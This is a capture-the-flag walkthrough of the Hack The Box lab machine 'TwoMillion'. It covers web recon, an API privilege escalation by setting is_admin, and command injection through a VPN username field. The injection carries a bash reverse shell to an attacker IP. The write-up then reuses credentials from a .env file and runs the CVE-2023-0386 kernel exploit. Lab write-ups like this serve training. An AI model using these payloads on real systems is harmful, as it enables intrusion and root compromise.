# TwoMillion

# Recon

## Port Scan

`nmap -sVC -A -T4 -oN nmap 10.10.11.221`

![Untitled](images/Untitled.png)

On the bottom of the scan we see this domain

![Untitled](images/Untitled%201.png)

So add it to hosts file

`echo -e "10.10.11.221\t2million.htb" >> /etc/hosts`

![Untitled](images/Untitled%202.png)

## Web

### Directory Discovery

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://2million.htb/FUZZ -t 10 -fl 8`

![Untitled](images/Untitled%203.png)

We need the Invitation code to Register maybe its on the API

### API Recon

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://2million.htb/api/FUZZ](http://2million.htb/api/FUZZ) -t 10 -fl 8`

![Untitled](images/Untitled%204.png)

**Kite Runner**

`kr scan [http://2million.htb/api/v1](http://2million.htb/api/v1) -w /opt/kiterunner-1.0.2/routes/routes-small.kite -x 10`

![Untitled](images/Untitled%205.png)

Inside this JS file was a obfuscated code about making the invitation code

![Untitled](images/Untitled%206.png)

After deobfuscate the code we found this endpoint

![Untitled](images/Untitled%207.png)

Make a `POST` request to it

![Untitled](images/Untitled%208.png)

Decoding the code

![Untitled](images/Untitled%209.png)

`NFZQMTUtSTJEVEYtRDdERUMtVFVOSVo=`

`4VP15-I2DTF-D7DEC-TUNIZ`

Now register an account and use the decoded invitation code

![Untitled](images/Untitled%2010.png)

### Web page

After login we get this page

![Untitled](images/Untitled%2011.png)

After messing around with the application i came back to `http://2million.htb/api/v1` as we are logged in we could read the endpoints there

`curl http://2million.htb/api/v1 -H "Cookie: PHPSESSID=3o4gkl8vcg91lcbo35kml40g3c" | jq .`

Some admin endpoints

![Untitled](images/Untitled%2012.png)

Just try use the endpoint

`curl -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) -H "Cookie: PHPSESSID=3o4gkl8vcg91lcbo35kml40g3c" | jq .`

![Untitled](images/Untitled%2013.png)

Found that we can put `json` content type

`curl -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) -H "Cookie: PHPSESSID=3o4gkl8vcg91lcbo35kml40g3c" -H "Content-Type: application/json" | jq .`

![Untitled](images/Untitled%2014.png)

We put our test email address

`curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=3o4gkl8vcg91lcbo35kml40g3c" -H "Content-Type: application/json" -d '{"email":"test@test.com"}'| jq .`

![Untitled](images/Untitled%2015.png)

And here we set the flag admin to 1

`curl -X PUT [http://2million.htb/api/v1/admin/settings/update](http://2million.htb/api/v1/admin/settings/update) -H "Cookie: PHPSESSID=3o4gkl8vcg91lcbo35kml40g3c" -H "Content-Type: application/json" -d '{"[email":"test@test.com](mailto:email%22:%22test@test.com)","is_admin":1}'| jq .`

![Untitled](images/Untitled%2016.png)

Now we can use the endpoint we found earlier to check if we are admin

`curl -X GET [http://2million.htb/api/v1/admin/auth](http://2million.htb/api/v1/admin/auth) -H "Cookie: PHPSESSID=3o4gkl8vcg91lcbo35kml40g3c" | jq .`

![Untitled](images/Untitled%2017.png)

Just make the request to `/api/v1/admin/vpn/generate` , set the content type to application/json and now set the username

![Untitled](images/Untitled%2018.png)

We can verify that the server isn’t checking for our user so any input it will validate, maybe its running bash to give us a VPN

By running `$(sleep 3)` as the username the app will take longer to load, it means we got command injection

$(sleep 3)

![Untitled](images/Untitled%2019.png)

Open a netcat listener

`nc -lvnp 9999`

![Untitled](images/Untitled%2020.png)

Now send a reverse shell

`$(bash -c 'bash -i >& /dev/tcp/10.10.14.15/9999 0>&1')`

![Untitled](images/Untitled%2021.png)

And we got the connection

![Untitled](images/Untitled%2022.png)

## Privilege escalation

### SQL Credentials

On the Index.php they use envVariables and there was a file named as `.env`

![Untitled](images/Untitled%2023.png)

Found the DB credentials

`cat .env`

![Untitled](images/Untitled%2024.png)

`admin`

`SuperDuperPass123`

Now just ssh into the admin user

`ssh admin@2million.htb`

**First flag**

![Untitled](images/Untitled%2025.png)

Dump the Database

`mysql -u admin -p`

![Untitled](images/Untitled%2026.png)

Found 2 admins

![Untitled](images/Untitled%2027.png)

After some time found some email

`cat /var/mail/admin`

![Untitled](images/Untitled%2028.png)

It seems there is a Kernel exploit `OverlayFS / FUSE`  , i used the exploit from this github [https://github.com/sxlmnwb/CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386)

After downloading the repository send it to the victim machine

Run the command make 

Now open two shells

On the first one run this code

`./fuse ./ovlcap/lower ./gc`

![Untitled](images/Untitled%2029.png)

On the second shell run this

`./exp`

![Untitled](images/Untitled%2030.png)
